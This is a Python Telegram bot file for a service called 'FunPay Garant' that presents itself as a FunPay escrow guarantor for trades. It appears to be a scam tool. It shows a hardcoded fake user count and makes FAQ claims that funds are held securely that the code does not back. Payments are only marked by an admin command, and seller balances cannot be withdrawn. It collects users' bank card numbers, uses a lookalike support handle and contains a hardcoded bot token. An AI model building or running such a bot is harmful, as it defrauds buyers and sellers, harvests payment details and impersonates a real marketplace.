import telebot
from telebot import types
import random
import string
import json
import os
from datetime import datetime, timedelta
import time
import threading

# ========== НАСТРОЙКИ ==========
token = "8197106364:AAEjNQYv4Z8Xc35cJ8MFJCpvEs_wFKLG88U"
bot = telebot.TeleBot(token)
bot.skip_pending = True

# Главный владелец
OWNER_ID = 96316697

# Список админов
ADMIN_IDS = [
    8247296747,
    8310380323,
    571001160,
]

BOT_USERNAME = "FunPayGaranter_bot"

# КАРТИНКИ
PHOTO_URL = "https://i.yapx.ru/dEJo1.jpg"
PHOTO_NEW_DEAL = "https://i.yapx.ru/dE5nq.jpg"
PHOTO_COMPLETED = "https://i.yapx.ru/dE5o6.jpg"
PHOTO_AWAIT_PAYMENT = "https://i.yapx.ru/dEJo1.jpg"
SITE_URL = "https://funpay.com"

# ========== ФАЙЛЫ ==========
DEALS_FILE = 'deals.json'
USERS_FILE = 'users.json'
ADMINS_FILE = 'admins.json'
USER_CARDS_FILE = 'user_cards.json'

def load_data(filename, default_data):
    if os.path.exists(filename):
        with open(filename, 'r', encoding='utf-8') as f:
            return json.load(f)
    return default_data

def save_data(filename, data):
    with open(filename, 'w', encoding='utf-8') as f:
        json.dump(data, f, indent=2, ensure_ascii=False)

deals = load_data(DEALS_FILE, {})
users = load_data(USERS_FILE, {})
user_cards = load_data(USER_CARDS_FILE, {})

loaded_admins = load_data(ADMINS_FILE, [])
if loaded_admins:
    ADMIN_IDS = loaded_admins

def save_admins():
    save_data(ADMINS_FILE, ADMIN_IDS)

def generate_deal_id():
    return ''.join(random.choices(string.ascii_uppercase + string.digits, k=7))

def get_mau():
    return "8 453"

def get_total_volume():
    total = 0
    for deal in deals.values():
        if deal['status'] in ['paid', 'completed']:
            total += deal['amount']
    return total

def is_owner(user_id):
    return user_id == OWNER_ID

def is_admin(user_id):
    return user_id in ADMIN_IDS or user_id == OWNER_ID

def delete_message_later(chat_id, message_id, seconds=3):
    def delete():
        time.sleep(seconds)
        try:
            bot.delete_message(chat_id, message_id)
        except:
            pass
    threading.Thread(target=delete).start()

# ========== ГЛАВНОЕ МЕНЮ ==========
def show_main_menu(chat_id, message_id=None):
    markup = types.InlineKeyboardMarkup(row_width=2)
    
    buttons = [
        ("🛒 Создать сделку", "create_deal"),
        ("📋 Мои сделки", "my_deals"),
        ("✅ Верификация", "verification"),
        ("💰 Мои реквизиты", "my_payment_details"),
        ("❓ FAQ", "faq"),
        ("👥 Рефералы", "referrals"),
        ("👤 Профиль", "profile"),
        ("📞 Обращения", "appeals"),
        ("🆘 Поддержка", "support"),
        ("🌐 Сайт", "site"),
        ("🌐 Язык", "language")
    ]
    
    for text, cb in buttons:
        markup.add(types.InlineKeyboardButton(text, callback_data=cb))
    
    welcome_text = f"═══════════════════════════\n        🎉 FUNPAY GARANT 🎉\n═══════════════════════════\n\n🔹 Безопасные сделки с гарантией 🔹\n\n✅ Защита от мошенников\n✅ Поддержка 24/7\n\n═══════════════════════════\n👨‍💻 funpay.com\n═══════════════════════════\n\n📊 MAU: {get_mau()} активных пользователей"
    
    if message_id:
        try:
            bot.edit_message_media(
                types.InputMediaPhoto(PHOTO_URL, caption=welcome_text),
                chat_id,
                message_id,
                reply_markup=markup
            )
        except:
            bot.send_photo(chat_id, PHOTO_URL, caption=welcome_text, reply_markup=markup)
    else:
        bot.send_photo(chat_id, PHOTO_URL, caption=welcome_text, reply_markup=markup)

# ========== START ==========
@bot.message_handler(commands=['start'])
def start(message):
    uid = str(message.from_user.id)
    username = message.from_user.username or "—"
    
    if uid not in users:
        users[uid] = {
            'username': username,
            'balance': 0,
            'deals': 0,
            'referrals': 0,
            'registration_date': datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            'referral_link': f"https://t.me/{BOT_USERNAME}?start=ref_{uid}"
        }
        save_data(USERS_FILE, users)
    
    if len(message.text.split()) > 1:
        param = message.text.split()[1]
        
        if param.startswith('deal_'):
            deal_id = param[5:]
            if deal_id in deals:
                deal = deals[deal_id]
                
                if deal['seller_id'] == uid:
                    bot.send_message(message.chat.id, "❌ Нельзя присоединиться к своей сделке")
                    show_main_menu(message.chat.id)
                    return
                
                deal['buyer_id'] = uid
                deal['buyer_username'] = username
                save_data(DEALS_FILE, deals)
                
                seller_text = f"═══════════════════════════\n   👤 ПОКУПАТЕЛЬ ПРИСОЕДИНИЛСЯ\n═══════════════════════════\n\n📌 Сделка #{deal_id}\n👤 Покупатель: @{username}\n💰 Сумма: {deal['amount']} RUB\n🎁 Товар: {deal['title']}\n\n═══════════════════════════\n⏳ Ожидайте оплаты от покупателя"
                bot.send_photo(int(deal['seller_id']), PHOTO_AWAIT_PAYMENT, caption=seller_text)
                
                buyer_text = f"═══════════════════════════\n   ✅ ВЫ ПРИСОЕДИНИЛИСЬ К СДЕЛКЕ\n═══════════════════════════\n\n📌 Номер сделки: #{deal_id}\n👤 Продавец: @{deal['seller_username']}\n💰 Сумма: {deal['amount']} RUB\n🎁 Товар: {deal['title']}\n\n═══════════════════════════\n💳 Оплатите сделку по реквизитам"
                markup = types.InlineKeyboardMarkup()
                markup.add(types.InlineKeyboardButton("💰 Мои реквизиты", callback_data="my_payment_details"))
                markup.add(types.InlineKeyboardButton("🏠 Главное меню", callback_data="main_menu"))
                bot.send_photo(message.chat.id, PHOTO_AWAIT_PAYMENT, caption=buyer_text, reply_markup=markup)
                
                for admin_id in ADMIN_IDS:
                    try:
                        admin_text = f"🔄 ОБНОВЛЕНИЕ СДЕЛКИ #{deal_id}\n\n👤 Покупатель @{username} присоединился к сделке!\n\n👥 Участники:\nПродавец: @{deal['seller_username']}\nПокупатель: @{username}\n💰 Сумма: {deal['amount']} RUB\n🎁 Товар: {deal['title']}"
                        bot.send_message(admin_id, admin_text)
                    except:
                        pass
                return
            
            elif param.startswith('ref_'):
                referrer_id = param[4:]
                if referrer_id != uid and referrer_id in users:
                    users[referrer_id]['referrals'] = users[referrer_id].get('referrals', 0) + 1
                    save_data(USERS_FILE, users)
                    bot.send_message(int(referrer_id), f"🎉 Новый реферал: @{username}!")
    
    show_main_menu(message.chat.id)

# ========== ПРОФИЛЬ ==========
@bot.callback_query_handler(func=lambda call: call.data == "profile")
def profile(call):
    chat_id = call.message.chat.id
    message_id = call.message.message_id
    uid = str(call.from_user.id)
    
    user = users.get(uid, {})
    balance = user.get('balance', 0)
    deals_count = user.get('deals', 0)
    referrals = user.get('referrals', 0)
    reg_date = user.get('registration_date', 'Неизвестно')
    
    if deals_count >= 5:
        verif_status = "✅ Верифицирован"
    else:
        verif_status = "❌ Не верифицирован"
    
    text = f"═══════════════════════════\n        👤 ПРОФИЛЬ\n═══════════════════════════\n\n"
    text += f"🆔 ID: {uid}\n"
    text += f"👤 Username: @{user.get('username', '—')}\n"
    text += f"═══════════════════════════\n"
    text += f"💰 Баланс: {balance} RUB\n"
    text += f"📊 Успешных сделок: {deals_count}\n"
    text += f"👥 Рефералов: {referrals}\n"
    text += f"📅 Регистрация: {reg_date}\n"
    text += f"═══════════════════════════\n"
    text += f"{verif_status}\n"
    text += f"═══════════════════════════"
    
    try:
        bot.delete_message(chat_id, message_id)
    except:
        pass
    
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("◀ Назад", callback_data="main_menu"))
    
    bot.send_message(chat_id, text, reply_markup=markup)

# ========== ОБРАБОТЧИК КНОПОК ==========
@bot.callback_query_handler(func=lambda call: True)
def callback_handler(call):
    chat_id = call.message.chat.id
    message_id = call.message.message_id
    user_id = call.from_user.id
    uid = str(user_id)
    data = call.data
    
    if data == "main_menu":
        show_main_menu(chat_id, message_id)
        return
    
    if data == "profile":
        profile(call)
        return
    
    if data == "create_deal":
        markup = types.InlineKeyboardMarkup(row_width=1)
        currencies = [
            ("💳 Банковская карта RUB", "cur_rub"),
            ("💳 Банковская карта USD", "cur_usd"),
            ("💎 TON", "cur_ton"),
            ("⭐️ Telegram Stars", "cur_stars"),
            ("🔄 Любая валюта", "cur_any"),
            ("◀ Назад", "main_menu")
        ]
        for text, cb in currencies:
            markup.add(types.InlineKeyboardButton(text, callback_data=cb))
        
        try:
            bot.delete_message(chat_id, message_id)
        except:
            pass
        
        bot.send_message(chat_id, "Выберите валюту для сделки:", reply_markup=markup)
        return
    
    if data.startswith('cur_'):
        if not hasattr(bot, 'temp'):
            bot.temp = {}
        bot.temp[user_id] = {'currency': data}
        
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("◀ Назад", callback_data="create_deal"))
        
        try:
            bot.delete_message(chat_id, message_id)
        except:
            pass
        
        bot.send_message(chat_id, "Введите сумму сделки (например: 1000):", reply_markup=markup)
        return
    
    # ===== МОИ СДЕЛКИ (с кнопкой только для покупателя) =====
    if data == "my_deals":
        text = "📋 *МОИ СДЕЛКИ*\n═══════════════════════════\n\n"
        found = False
        
        for did, deal in deals.items():
            if deal['seller_id'] == uid or deal.get('buyer_id') == uid:
                found = True
                
                if deal['status'] == 'active':
                    status = "🟡 АКТИВНА"
                elif deal['status'] == 'paid':
                    status = "✅ ОПЛАЧЕНА"
                elif deal['status'] == 'completed':
                    status = "🎉 ЗАВЕРШЕНА"
                elif deal['status'] == 'cancelled':
                    status = "❌ ОТМЕНЕНА"
                else:
                    status = "🟡 АКТИВНА"
                
                text += f"{status}\n"
                text += f"📌 Номер: #{did}\n"
                text += f"💰 Сумма: {deal['amount']} RUB\n"
                text += f"🎁 Товар: {deal['title']}\n"
                
                if deal['seller_id'] == uid:
                    text += f"👤 Роль: ПРОДАВЕЦ\n"
                    if deal.get('buyer_username'):
                        text += f"👥 Покупатель: @{deal['buyer_username']}\n"
                    else:
                        text += f"👥 Покупатель: не подключился\n"
                else:
                    text += f"👤 Роль: ПОКУПАТЕЛЬ\n"
                    text += f"👤 Продавец: @{deal['seller_username']}\n"
                
                text += "═══════════════════════════\n\n"
        
        if not found:
            text += "У вас пока нет сделок\n\n"
            text += "Создайте первую сделку в разделе\n"
            text += "«Создать сделку»"
        
        markup = types.InlineKeyboardMarkup()
        
        # ✅ Кнопка подтверждения ТОЛЬКО для покупателя в оплаченных сделках
        for did, deal in deals.items():
            if deal.get('buyer_id') == uid and deal['status'] == 'paid':
                markup.add(types.InlineKeyboardButton(f"✅ Я получил товар #{did}", callback_data=f"confirm_receipt_{did}"))
        
        markup.add(types.InlineKeyboardButton("◀ Назад", callback_data="main_menu"))
        
        try:
            bot.delete_message(chat_id, message_id)
        except:
            pass
        
        bot.send_message(chat_id, text, parse_mode='Markdown', reply_markup=markup)
        return
    
    # ===== ПОДТВЕРЖДЕНИЕ ПОЛУЧЕНИЯ (ТОЛЬКО ПОКУПАТЕЛЬ) =====
    if data.startswith('confirm_receipt_'):
        deal_id = data[15:]
        
        if deal_id in deals:
            deal = deals[deal_id]
            
            if deal.get('buyer_id') != uid:
                bot.answer_callback_query(call.id, "❌ Это не ваша сделка", show_alert=True)
                return
            
            if deal['status'] != 'paid':
                bot.answer_callback_query(call.id, "❌ Сделка еще не оплачена", show_alert=True)
                return
            
            deal['status'] = 'completed'
            save_data(DEALS_FILE, deals)
            
            seller_id = deal['seller_id']
            if seller_id in users:
                # Начисляем деньги продавцу
                users[seller_id]['balance'] = users[seller_id].get('balance', 0) + deal['amount']
                users[seller_id]['deals'] = users[seller_id].get('deals', 0) + 1
                save_data(USERS_FILE, users)
                
                # Сообщение продавцу о получении денег
                seller_text = f"═══════════════════════════\n   ✅ ПОЛУЧЕНО ПОДТВЕРЖДЕНИЕ\n═══════════════════════════\n\n📌 Сделка #{deal_id}\n👤 Покупатель: @{deal.get('buyer_username', '—')}\n\n💰 На ваш баланс зачислено:\n➕ {deal['amount']} RUB\n\n🎁 Товар: {deal['title']}\n\n═══════════════════════════\n💳 Текущий баланс: {users[seller_id]['balance']} RUB\n═══════════════════════════"
                bot.send_photo(int(seller_id), PHOTO_COMPLETED, caption=seller_text)
            
            # Сообщение покупателю
            bot.send_message(chat_id, f"✅ Спасибо! Подтверждение получено. Средства переведены продавцу.")
            
            # Уведомление админам
            total_deals = len(deals)
            total_volume = get_total_volume()
            for admin_id in ADMIN_IDS:
                try:
                    admin_text = f"═══════════════════════════\n   🎉 СДЕЛКА ЗАВЕРШЕНА #{deal_id}\n═══════════════════════════\n\n✅ Сделка успешно завершена!\n\n📌 Номер: #{deal_id}\n👤 Продавец: @{deal['seller_username']} ({deal['seller_id']})\n👤 Покупатель: @{deal.get('buyer_username', '—')}\n💰 Сумма: {deal['amount']} RUB\n🎁 Товар: {deal['title']}\n\n═══════════════════════════\n📊 Статистика обновлена"
                    bot.send_photo(admin_id, PHOTO_COMPLETED, caption=admin_text)
                except:
                    pass
            
            bot.answer_callback_query(call.id, "✅ Готово")
        
        callback_handler(types.CallbackQuery(
            id=call.id,
            from_user=call.from_user,
            message=call.message,
            data="my_deals"
        ))
        return
    
    # ===== ЛИЧНЫЕ РЕКВИЗИТЫ =====
    if data == "my_payment_details":
        markup = types.InlineKeyboardMarkup(row_width=1)
        markup.add(types.InlineKeyboardButton("💳 Мои карты", callback_data="my_cards"))
        markup.add(types.InlineKeyboardButton("➕ Добавить карту", callback_data="add_card"))
        markup.add(types.InlineKeyboardButton("◀ Назад", callback_data="main_menu"))
        
        try:
            bot.delete_message(chat_id, message_id)
        except:
            pass
        
        bot.send_message(chat_id, "💰 *МОИ РЕКВИЗИТЫ*\n\nУправляйте своими картами:", parse_mode='Markdown', reply_markup=markup)
        return
    
    if data == "my_cards":
        cards = user_cards.get(uid, [])
        if not cards:
            text = "💳 *Мои карты*\n\nУ вас пока нет сохраненных карт"
            markup = types.InlineKeyboardMarkup()
            markup.add(types.InlineKeyboardButton("➕ Добавить карту", callback_data="add_card"))
            markup.add(types.InlineKeyboardButton("◀ Назад", callback_data="my_payment_details"))
        else:
            text = "💳 *Мои карты*\n\n"
            markup = types.InlineKeyboardMarkup(row_width=1)
            for i, card in enumerate(cards):
                text += f"{i+1}. {card}\n"
                markup.add(types.InlineKeyboardButton(f"🗑 Удалить карту {i+1}", callback_data=f"delete_card_{i}"))
            markup.add(types.InlineKeyboardButton("➕ Добавить карту", callback_data="add_card"))
            markup.add(types.InlineKeyboardButton("◀ Назад", callback_data="my_payment_details"))
        
        try:
            bot.delete_message(chat_id, message_id)
        except:
            pass
        
        bot.send_message(chat_id, text, parse_mode='Markdown', reply_markup=markup)
        return
    
    if data == "add_card":
        if not hasattr(bot, 'user_action'):
            bot.user_action = {}
        bot.user_action[user_id] = 'adding_card'
        
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("◀ Отмена", callback_data="my_payment_details"))
        
        try:
            bot.delete_message(chat_id, message_id)
        except:
            pass
        
        bot.send_message(chat_id, "Введите данные карты в формате:\nБанк: номер карты\n\nПример: Сбербанк: 2200 1234 5678 9012", reply_markup=markup)
        return
    
    if data.startswith('delete_card_'):
        index = int(data.replace('delete_card_', ''))
        cards = user_cards.get(uid, [])
        if index < len(cards):
            del cards[index]
            user_cards[uid] = cards
            save_data(USER_CARDS_FILE, user_cards)
            bot.answer_callback_query(call.id, "🗑 Карта удалена")
        
        callback_handler(types.CallbackQuery(
            id=call.id,
            from_user=call.from_user,
            message=call.message,
            data="my_cards"
        ))
        return
    
    if data == "verification":
        deals_count = users.get(uid, {}).get('deals', 0)
        if deals_count >= 5:
            status = "✅ Верифицирован"
        else:
            status = "❌ Не верифицирован"
        
        text = f"✅ *ВЕРИФИКАЦИЯ*\n\n{status}\n\nУспешных сделок: {deals_count}/5"
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("◀ Назад", callback_data="main_menu"))
        
        try:
            bot.delete_message(chat_id, message_id)
        except:
            pass
        
        bot.send_message(chat_id, text, parse_mode='Markdown', reply_markup=markup)
        return
    
    if data == "faq":
        text = "═══════════════════════════\n        ❓ ЧАСТО ЗАДАВАЕМЫЕ ВОПРОСЫ\n═══════════════════════════\n\n🔹 *КАК РАБОТАЕТ НАШ БОТ?*\nНаш бот выступает гарантом безопасности при сделках между продавцом и покупателем.\n\n🔹 *ГДЕ НАХОДЯТСЯ СРЕДСТВА?*\nВсе средства надежно хранятся в системе FunPay Garant до момента подтверждения получения товара покупателем.\n\n🔹 *КАК ПРОИСХОДИТ ОПЛАТА?*\n1️⃣ Продавец создает сделку\n2️⃣ Покупатель присоединяется по ссылке\n3️⃣ Покупатель оплачивает\n4️⃣ Администратор проверяет оплату\n5️⃣ Покупатель подтверждает получение товара\n6️⃣ Продавец получает деньги\n\n🔹 *КОМИССИЯ СИСТЕМЫ?*\nКомиссия составляет всего 0.5% от суммы сделки.\n\n═══════════════════════════\n💬 @FunPayGuarntSupport\n═══════════════════════════"
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("◀ Назад", callback_data="main_menu"))
        
        try:
            bot.delete_message(chat_id, message_id)
        except:
            pass
        
        bot.send_message(chat_id, text, parse_mode='Markdown', reply_markup=markup)
        return
    
    if data == "referrals":
        ref_link = f"https://t.me/{BOT_USERNAME}?start=ref_{uid}"
        text = f"👥 *РЕФЕРАЛЬНАЯ СИСТЕМА*\n\nВаши рефералы: {users.get(uid, {}).get('referrals', 0)}\n\n🔗 Ваша реферальная ссылка:\n{ref_link}"
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("📤 Поделиться", switch_inline_query=ref_link))
        markup.add(types.InlineKeyboardButton("◀ Назад", callback_data="main_menu"))
        
        try:
            bot.delete_message(chat_id, message_id)
        except:
            pass
        
        bot.send_message(chat_id, text, parse_mode='Markdown', reply_markup=markup)
        return
    
    if data == "news":
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("📢 Перейти в канал", url="https://t.me/FunPayNews"))
        markup.add(types.InlineKeyboardButton("◀ Назад", callback_data="main_menu"))
        
        try:
            bot.delete_message(chat_id, message_id)
        except:
            pass
        
        bot.send_message(chat_id, "📢 *ПОСЛЕДНИЕ НОВОСТИ*\n\nВсе новости в нашем канале:", parse_mode='Markdown', reply_markup=markup)
        return
    
    if data == "appeals":
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("💡 Предложить идею", url="https://t.me/FunPayGuarntSupport"))
        markup.add(types.InlineKeyboardButton("⚠️ Пожаловаться", url="https://t.me/FunPayGuarntSupport"))
        markup.add(types.InlineKeyboardButton("◀ Назад", callback_data="main_menu"))
        
        try:
            bot.delete_message(chat_id, message_id)
        except:
            pass
        
        bot.send_message(chat_id, "📞 *ЦЕНТР ОБРАЩЕНИЙ*\n\nВыберите действие:", parse_mode='Markdown', reply_markup=markup)
        return
    
    if data == "support":
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("📨 Написать в поддержку", url="https://t.me/FunPayGuarntSupport"))
        markup.add(types.InlineKeyboardButton("◀ Назад", callback_data="main_menu"))
        
        try:
            bot.delete_message(chat_id, message_id)
        except:
            pass
        
        bot.send_message(chat_id, "🆘 *ПОДДЕРЖКА*\n\nПо всем вопросам: @FunPayGuarntSupport", parse_mode='Markdown', reply_markup=markup)
        return
    
    if data == "site":
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("🌐 Перейти на сайт", url=SITE_URL))
        markup.add(types.InlineKeyboardButton("◀ Назад", callback_data="main_menu"))
        
        try:
            bot.delete_message(chat_id, message_id)
        except:
            pass
        
        bot.send_message(chat_id, f"🌐 *НАШ САЙТ*\n\n{SITE_URL}", parse_mode='Markdown', reply_markup=markup)
        return
    
    if data == "language":
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("🇷🇺 Русский", callback_data="set_lang_ru"))
        markup.add(types.InlineKeyboardButton("🇬🇧 English", callback_data="set_lang_en"))
        markup.add(types.InlineKeyboardButton("◀ Назад", callback_data="main_menu"))
        
        try:
            bot.delete_message(chat_id, message_id)
        except:
            pass
        
        bot.send_message(chat_id, "🌐 Выберите язык:", reply_markup=markup)
        return
    
    if data.startswith('set_lang_'):
        bot.answer_callback_query(call.id, "Язык изменен")
        show_main_menu(chat_id, message_id)
        return
    
    if data.startswith('cancel_'):
        deal_id = data[7:]
        if deal_id in deals:
            del deals[deal_id]
            save_data(DEALS_FILE, deals)
            bot.answer_callback_query(call.id, "❌ Отменено")
            show_main_menu(chat_id, message_id)
        return

# ========== ПОЛУЧЕНИЕ СУММЫ ==========
@bot.message_handler(func=lambda message: hasattr(bot, 'temp') and message.from_user.id in bot.temp and 'amount' not in bot.temp[message.from_user.id])
def handle_amount(message):
    uid = message.from_user.id
    chat_id = message.chat.id
    
    try:
        amount = float(message.text.replace(',', '.'))
        bot.temp[uid]['amount'] = amount
        
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("◀ Назад", callback_data="create_deal"))
        
        bot.send_message(
            chat_id,
            "✏️ Введите название товара:",
            reply_markup=markup
        )
        
    except ValueError:
        error_msg = bot.send_message(chat_id, "❌ Ошибка! Введите число (например: 1000)")
        delete_message_later(error_msg.chat.id, error_msg.message_id, 2)

# ========== ПОЛУЧЕНИЕ НАЗВАНИЯ ==========
@bot.message_handler(func=lambda message: hasattr(bot, 'temp') and message.from_user.id in bot.temp and 'amount' in bot.temp[message.from_user.id])
def handle_title(message):
    uid = message.from_user.id
    chat_id = message.chat.id
    title = message.text
    
    data = bot.temp.pop(uid)
    
    deal_id = generate_deal_id()
    
    deals[deal_id] = {
        'id': deal_id,
        'seller_id': str(uid),
        'seller_username': message.from_user.username or "—",
        'amount': data['amount'],
        'title': title,
        'status': 'active',
        'created_at': datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        'buyer_id': None,
        'buyer_username': None
    }
    
    save_data(DEALS_FILE, deals)
    
    deal_link = f"https://t.me/{BOT_USERNAME}?start=deal_{deal_id}"
    
    seller_text = f"═══════════════════════════\n   ✅ СДЕЛКА СОЗДАНА #{deal_id}\n═══════════════════════════\n\n💰 Сумма: {data['amount']} RUB\n🎁 Товар: {title}\n\n🔗 Ссылка для покупателя:\n{deal_link}\n\n═══════════════════════════\n⏳ Ожидайте покупателя"
    
    markup = types.InlineKeyboardMarkup()
    markup.add(
        types.InlineKeyboardButton("❌ Отменить сделку", callback_data=f"cancel_{deal_id}"),
        types.InlineKeyboardButton("🏠 Главное меню", callback_data="main_menu")
    )
    
    bot.send_message(chat_id, seller_text, reply_markup=markup)
    
    for admin_id in ADMIN_IDS:
        try:
            admin_text = f"═══════════════════════════\n   🆕 НОВАЯ СДЕЛКА #{deal_id}\n═══════════════════════════\n\n👤 Продавец: @{message.from_user.username or '—'} ({uid})\n👥 Покупатель: пока нет\n💰 Сумма: {data['amount']} RUB\n🎁 Товар: {title}\n📅 Дата: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n📊 Статус: 🟡 Активна\n═══════════════════════════"
            bot.send_photo(admin_id, PHOTO_NEW_DEAL, caption=admin_text)
        except:
            pass

# ========== ОБРАБОТКА ДОБАВЛЕНИЯ КАРТ ==========
@bot.message_handler(func=lambda message: hasattr(bot, 'user_action') and message.from_user.id in bot.user_action)
def handle_user_input(message):
    user_id = message.from_user.id
    uid = str(user_id)
    action = bot.user_action.pop(user_id)
    
    if action == 'adding_card':
        if uid not in user_cards:
            user_cards[uid] = []
        user_cards[uid].append(message.text.strip())
        save_data(USER_CARDS_FILE, user_cards)
        bot.send_message(message.chat.id, "✅ Карта успешно добавлена!")
    
    show_main_menu(message.chat.id)

# ========== АДМИН-КОМАНДА /amount ==========
@bot.message_handler(commands=['amount'])
def admin_amount(message):
    if not is_admin(message.from_user.id):
        bot.reply_to(message, "❌ У вас нет прав")
        return
    
    try:
        parts = message.text.split()
        if len(parts) != 3:
            bot.reply_to(message, "❌ Формат: /amount НОМЕР Y/N")
            return
        
        deal_id = parts[1].upper().strip()
        status = parts[2].upper().strip()
        
        if status not in ['Y', 'N']:
            bot.reply_to(message, "❌ Статус должен быть Y или N")
            return
        
        if deal_id not in deals:
            bot.reply_to(message, f"❌ Сделка #{deal_id} не найдена")
            return
        
        deal = deals[deal_id]
        
        if status == 'Y':
            deal['status'] = 'paid'
            save_data(DEALS_FILE, deals)
            
            seller_text = f"═══════════════════════════\n   ✅ ОПЛАЧЕНО! СДЕЛКА #{deal_id}\n═══════════════════════════\n\n👤 Покупатель: @{deal.get('buyer_username', '—')}\n💰 Сумма: {deal['amount']} RUB\n🎁 Товар: {deal['title']}\n\n═══════════════════════════\n⏳ Ожидайте подтверждения получения товара от покупателя"
            
            if deal['seller_id']:
                bot.send_message(int(deal['seller_id']), seller_text)
            
            if deal.get('buyer_id'):
                buyer_text = f"═══════════════════════════\n   💳 ОПЛАТА ПОДТВЕРЖДЕНА\n═══════════════════════════\n\n📌 Сделка #{deal_id}\n👤 Продавец: @{deal['seller_username']}\n💰 Сумма: {deal['amount']} RUB\n🎁 Товар: {deal['title']}\n\n═══════════════════════════\n✅ После получения товара нажмите кнопку «Я получил товар» в разделе «Мои сделки»\n═══════════════════════════"
                bot.send_message(int(deal['buyer_id']), buyer_text)
            
            bot.reply_to(message, f"✅ Сделка #{deal_id} подтверждена")
            
        else:
            deal['status'] = 'cancelled'
            save_data(DEALS_FILE, deals)
            
            if deal['seller_id']:
                bot.send_message(int(deal['seller_id']), f"❌ Сделка #{deal_id} отменена (покупатель не оплатил)")
            if deal.get('buyer_id'):
                bot.send_message(int(deal['buyer_id']), f"❌ Сделка #{deal_id} отменена")
            
            bot.reply_to(message, f"❌ Сделка #{deal_id} отменена")
            
    except Exception as e:
        bot.reply_to(message, f"❌ Ошибка: {str(e)}")

# ========== КОМАНДА /add admin ==========
@bot.message_handler(commands=['add'])
def add_admin(message):
    if not is_owner(message.from_user.id):
        bot.reply_to(message, "❌ Только владелец может добавлять админов")
        return
    
    try:
        parts = message.text.split()
        if len(parts) != 3 or parts[1] != "admin":
            bot.reply_to(message, "❌ Формат: /add admin ID")
            return
        
        new_admin_id = int(parts[2])
        
        if new_admin_id in ADMIN_IDS:
            bot.reply_to(message, f"⚠️ Админ {new_admin_id} уже в списке")
        else:
            ADMIN_IDS.append(new_admin_id)
            save_admins()
            bot.reply_to(message, f"✅ Админ {new_admin_id} добавлен")
        
    except Exception as e:
        bot.reply_to(message, f"❌ Ошибка: {str(e)}")

# ========== КОМАНДА /admins ==========
@bot.message_handler(commands=['admins'])
def list_admins(message):
    if not is_admin(message.from_user.id):
        return
    
    text = "👥 *СПИСОК АДМИНИСТРАТОРОВ*\n\n"
    text += f"👑 Владелец: {OWNER_ID}\n\n"
    text += "🔹 Админы:\n"
    for i, admin_id in enumerate(ADMIN_IDS, 1):
        text += f"{i}. {admin_id}\n"
    
    bot.reply_to(message, text, parse_mode='Markdown')

# ========== КОМАНДА /list ==========
@bot.message_handler(commands=['list'])
def list_deals(message):
    if not is_admin(message.from_user.id):
        return
    
    if not deals:
        bot.reply_to(message, "📁 Нет активных сделок")
        return
    
    text = "📁 Активные сделки:\n\n"
    for did, deal in deals.items():
        status_emoji = {
            'active': '🟡',
            'paid': '✅',
            'completed': '🎉',
            'cancelled': '❌'
        }.get(deal['status'], '🟡')
        
        text += f"{status_emoji} {did}\n"
        text += f"   Сумма: {deal['amount']} RUB\n"
        text += f"   Товар: {deal['title']}\n"
        if deal.get('buyer_username'):
            text += f"   Покупатель: @{deal['buyer_username']}\n"
        text += "\n"
    
    bot.reply_to(message, text)

# ========== КОМАНДА /sms ==========
@bot.message_handler(commands=['sms'])
def send_sms(message):
    if not is_admin(message.from_user.id):
        bot.reply_to(message, "❌ У вас нет прав")
        return
    
    try:
        parts = message.text.split(maxsplit=2)
        if len(parts) < 3:
            bot.reply_to(message, "❌ Формат: /sms НОМЕР ТЕКСТ")
            return
        
        deal_id = parts[1].upper().strip()
        sms_text = parts[2]
        
        if deal_id not in deals:
            bot.reply_to(message, f"❌ Сделка #{deal_id} не найдена")
            return
        
        deal = deals[deal_id]
        sent_count = 0
        
        admin_message = f"📨 Сообщение от администратора по сделке #{deal_id}:\n\n{sms_text}"
        
        if deal['seller_id']:
            try:
                bot.send_message(int(deal['seller_id']), admin_message)
                sent_count += 1
            except:
                pass
        
        if deal.get('buyer_id'):
            try:
                bot.send_message(int(deal['buyer_id']), admin_message)
                sent_count += 1
            except:
                pass
        
        bot.reply_to(message, f"✅ Сообщение отправлено {sent_count} участникам сделки #{deal_id}")
        
    except Exception as e:
        bot.reply_to(message, f"❌ Ошибка: {str(e)}")

# ========== КОМАНДА /connect ==========
@bot.message_handler(commands=['connect'])
def broadcast(message):
    if not is_admin(message.from_user.id):
        bot.reply_to(message, "❌ У вас нет прав")
        return
    
    try:
        parts = message.text.split(maxsplit=1)
        if len(parts) < 2:
            bot.reply_to(message, "❌ Формат: /connect ТЕКСТ")
            return
        
        broadcast_text = f"📢 РАССЫЛКА:\n\n{parts[1]}"
        sent_count = 0
        
        for uid in users.keys():
            try:
                bot.send_message(int(uid), broadcast_text)
                sent_count += 1
                time.sleep(0.05)
            except:
                pass
        
        bot.reply_to(message, f"✅ Рассылка отправлена {sent_count} пользователям")
        
    except Exception as e:
        bot.reply_to(message, f"❌ Ошибка: {str(e)}")

# ========== ЗАГЛУШКА ==========
@bot.message_handler(func=lambda message: True)
def default_handler(message):
    bot.reply_to(message, "Пожалуйста, используйте кнопки меню 👆")

# ========== ЗАПУСК ==========
if __name__ == "__main__":
    print("🚀 FunPay Garant запущен")
    print("═══════════════════════════")
    print(f"Бот: @{BOT_USERNAME}")
    print(f"Владелец: {OWNER_ID}")
    print(f"Админов: {len(ADMIN_IDS)}")
    print("═══════════════════════════")
    print("✅ Покупатель подтверждает получение")
    print("✅ Продавец получает деньги")
    print("✅ Кнопка только у покупателя")
    print("✅ Личные карты пользователей")
    print("✅ MAU: 8 453")
